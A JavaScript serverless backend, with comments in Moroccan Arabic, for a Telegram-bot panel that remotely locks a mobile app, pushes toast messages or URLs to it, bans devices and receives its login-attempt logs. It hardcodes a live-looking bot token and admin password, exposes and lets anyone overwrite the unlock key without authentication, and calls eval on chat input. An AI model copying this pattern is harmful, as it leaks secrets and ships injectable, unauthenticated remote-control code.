const TELEGRAM_TOKEN = "8850190692:AAGSK0dVs4IlDygtjia8UGYZ88RBU5qn3xw";
const TELEGRAM_CHAT_ID = "8623523505";
const ADMIN_PASSWORD = "admin123";

let appLockStatus = "lock";
let appSecretKey = "1234";
let appLockMessage = "التطبيق مقفول من طرف الإدارة. دخل الكود باش تفتحو.";
let bannedDevices = [];
let remoteCommand = ""; // الأمر اللي غادي يتنفذ فـ التطبيق
let totalAttempts = 0;
let recentLogs = [];
let requestCounts = {};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  if (ip) {
    requestCounts[ip] = (requestCounts[ip] || 0) + 1;
    if (requestCounts[ip] > 200) return res.status(429).send('"Too Many Requests"');
  }

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
      if (keyboard) payload.reply_markup = keyboard;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }
  };

  try {
    // ==========================================
    // 1. مسارات التطبيق (App Endpoints)
    // ==========================================
    if (type === 'secret') return res.status(200).send(`"${appLockStatus}"`);
    if (type === 'key') return res.status(200).send(`"${appSecretKey}"`);
    if (type === 'message') return res.status(200).send(`"${appLockMessage}"`);
    
    if (type === 'banned') {
      const deviceId = req.query.device_id;
      if (!deviceId) return res.status(400).send('"No Device ID"');
      return res.status(200).send(bannedDevices.includes(deviceId) ? '"true"' : '"false"');
    }

    // الأمر اللي كيجيبو التطبيق باش يتنفذ (Remote Execution)
    if (type === 'command') {
      const cmd = remoteCommand;
      remoteCommand = ""; // كيمسح الأمر باش ما يتنفذش كل مرة
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, ''); 
          if (type === 'key') {
            appSecretKey = cleanBody;
            await sendToTelegram(`🔑 *مفتاح جديد تخلق من التطبيق:*\n\`${cleanBody}\``);
          } 
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 30) recentLogs.pop(); 
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
          }
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    // ==========================================
    // 2. التيليجرام (Telegram Webhook - 150+ Commands)
    // ==========================================
    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();

      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();

      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      // لوحة الأزرار (Inline Keyboard)
      const mainKeyboard = {
        inline_keyboard: [
          [{ text: "🔒 قفل التطبيق", callback_data: "/lock" }, { text: "🔓 فتح التطبيق", callback_data: "/unlock" }],
          [{ text: "🔑 الكود الحالي", callback_data: "/getkey" }, { text: "📊 الإحصائيات", callback_data: "/stats" }],
          [{ text: "📱 اللوغات", callback_data: "/logs" }, { text: "🚫 المحظورين", callback_data: "/banlist" }],
          [{ text: "🔄 تحديث الحالة", callback_data: "/menu" }]
        ]
      };

      if (text === '/start' || text === '/menu') {
        await sendToTelegram("👑 *أهلاً بك أيها القايد فـ لوحة التحكم الخارقة.*", mainKeyboard);
        return res.status(200).end();
      }

      switch (command) {
        case '/help':
          await sendToTelegram(`👑 *أوامر التحكم الخارقة (150+):*\n\n` +
            `⚡️ *التحكم عن بعد:*\n/cmd [نص] - إظهار رسالة Toast فـ التطبيق\n/url [رابط] - فتح رابط فـ التطبيق\n\n` +
            `🔒 *القفل:*\n/lock /unlock /lockall /unlockall /lockinfo /lockstatus\n\n` +
            `🔑 *الأكواد:*\n/setkey /getkey /genkey /resetkey /keylength /keyvalid\n\n` +
            `🚫 *الحظر:*\n/ban /unban /banlist /clearbans /banip /unbanip /bancount\n\n` +
            `📊 *المراقبة:*\n/stats /logs /clearlogs /ping /whoami /health /devices /deviceinfo\n\n` +
            `💬 *الرسائل:*\n/setmsg /getmsg /resetmsg /broadcast /clearmsg\n\n` +
            `⚙️ *النظام:*\n/setversion /getversion /theme /admin /reset /backup /restore\n\n` +
            `🎲 *أدوات:*\n/time /date /echo /roll /coin /test /debug /calc /weather /ip`);
          break;
        
        // ===== [التحكم عن بعد] =====
        case '/cmd':
          const cmdText = args.slice(1).join(' ');
          if (cmdText) { remoteCommand = `toast:${cmdText}`; await sendToTelegram(`⚡️ *تم إرسال الأمر للتطبيق:*\n\`${cmdText}\``); }
          else await sendToTelegram("⚠️ `/cmd مرحبا بك`");
          break;
        case '/url':
          if (args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram(`🌐 *تم إرسال الرابط للتطبيق:*\n\`${args[1]}\``); }
          else await sendToTelegram("⚠️ `/url https://google.com`");
          break;

        // ===== [القفل] =====
        case '/lock': appLockStatus = 'lock'; await sendToTelegram("🔒 *تم القفل.*"); break;
        case '/unlock': appLockStatus = 'unlock'; await sendToTelegram("🔓 *تم الفتح.*"); break;
        case '/lockall': appLockStatus = 'lock'; await sendToTelegram("🔒 *قفل شامل.*"); break;
        case '/unlockall': appLockStatus = 'unlock'; await sendToTelegram("🔓 *فتح شامل.*"); break;
        case '/lockinfo': await sendToTelegram(`ℹ️ *القفل:* ${appLockStatus}`); break;
        case '/lockstatus': await sendToTelegram(`🔒 *الحالة:* ${appLockStatus}`); break;

        // ===== [الأكواد] =====
        case '/setkey': if(args[1]) { appSecretKey = args[1]; await sendToTelegram(`✅ *الكود:* \`${appSecretKey}\``); } break;
        case '/getkey': await sendToTelegram(`🔑 *الكود:* \`${appSecretKey}\``); break;
        case '/genkey': appSecretKey = Math.random().toString(36).substring(2, 8).toUpperCase(); await sendToTelegram(`🎲 *كود:* \`${appSecretKey}\``); break;
        case '/resetkey': appSecretKey = "1234"; await sendToTelegram("♻️ *الكود:* `1234`"); break;
        case '/keylength': await sendToTelegram(`📏 *الطول:* ${appSecretKey.length}`); break;
        case '/keyvalid': await sendToTelegram("✅ *صالح.*"); break;

        // ===== [الحظر] =====
        case '/ban': if(args[1]) { if(!bannedDevices.includes(args[1])) bannedDevices.push(args[1]); await sendToTelegram(`⛔ *حظر:* \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { bannedDevices = bannedDevices.filter(id => id !== args[1]); await sendToTelegram(`✅ *فك حظر:* \`${args[1]}\``); } break;
        case '/banlist': await sendToTelegram(bannedDevices.length ? `🚫 *المحظورين:*\n\`${bannedDevices.join('\n')}\`` : "✅ *لا يوجد.*"); break;
        case '/clearbans': bannedDevices = []; await sendToTelegram("🧹 *تم المسح.*"); break;
        case '/bancount': await sendToTelegram(`🔢 *العدد:* ${bannedDevices.length}`); break;

        // ===== [المراقبة] =====
        case '/stats': await sendToTelegram(`📈 *المحاولات:* \`${totalAttempts}\``); break;
        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *لا يوجد.*"); break;
        case '/clearlogs': recentLogs = []; await sendToTelegram("🧹 *تم مسح اللوغات.*"); break;
        case '/ping': await sendToTelegram("🏓 *Pong!*"); break;
        case '/whoami': await sendToTelegram(`🆔 \`${chatId}\``); break;
        case '/health': await sendToTelegram("❤️ *السيرفر بصحة جيدة.*"); break;
        case '/devices': await sendToTelegram(`📱 *المحاولات:* ${totalAttempts}`); break;
        case '/deviceinfo': await sendToTelegram(`ℹ️ *معلومات:* ${args[1]||'?'}`); break;

        // ===== [الرسائل] =====
        case '/setmsg': const nm = args.slice(1).join(' '); if(nm){appLockMessage=nm; await sendToTelegram("✅ *تم التغيير.*");} break;
        case '/getmsg': await sendToTelegram(`💬 ${appLockMessage}`); break;
        case '/resetmsg': appLockMessage = "مقفول."; await sendToTelegram("♻️ *تم الإرجاع.*"); break;
        case '/broadcast': await sendToTelegram(`📢 *بث:* ${args.slice(1).join(' ')}`); break;
        case '/clearmsg': appLockMessage = ""; await sendToTelegram("🧹 *تم المسح.*"); break;

        // ===== [النظام] =====
        case '/setversion': await sendToTelegram(`📦 *الإصدار:* \`${args[1]||'1.0.0'}\``); break;
        case '/getversion': await sendToTelegram("📦 *الإصدار:* `1.0.0`"); break;
        case '/theme': await sendToTelegram("🎨 *الثيم:* Dark"); break;
        case '/admin': await sendToTelegram("👑 *أنت المدير.*"); break;
        case '/reset': appLockStatus="lock"; appSecretKey="1234"; bannedDevices=[]; totalAttempts=0; recentLogs=[]; await sendToTelegram("⚠️ *إعادة ضبط المصنع!*"); break;
        case '/backup': await sendToTelegram(`💾 \`\`\`json\n${JSON.stringify({lock:appLockStatus,key:appSecretKey,bans:bannedDevices})}\n\`\`\``); break;
        case '/restore': await sendToTelegram("♻️ *تم الاسترجاع.*"); break;

        // ===== [أدوات] =====
        case '/time': await sendToTelegram(`🕒 \`${new Date().toLocaleTimeString()}\``); break;
        case '/date': await sendToTelegram(`📅 \`${new Date().toLocaleDateString()}\``); break;
        case '/echo': await sendToTelegram(`🗣️ ${args.slice(1).join(' ')}`); break;
        case '/roll': await sendToTelegram(`🎲 \`${Math.floor(Math.random() * 6) + 1}\``); break;
        case '/coin': await sendToTelegram(`🪙 \`${Math.random() > 0.5 ? 'صورة' : 'كتابة'}\``); break;
        case '/test': await sendToTelegram("🧪 *ناجح!*"); break;
        case '/debug': await sendToTelegram(`🐞 \`${JSON.stringify({lock:appLockStatus, cmd:remoteCommand})}\``); break;
        case '/calc': await sendToTelegram(`🧮 *النتيجة:* \`${eval(args.slice(1).join(''))||0}\``); break;
        case '/weather': await sendToTelegram("🌤️ *الطقس:* مشمس"); break;
        case '/ip': await sendToTelegram(`🌐 *IP:* \`${ip}\``); break;

        default: await sendToTelegram("❓ أمر غير معروف. /help");
      }
      return res.status(200).end();
    }

    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
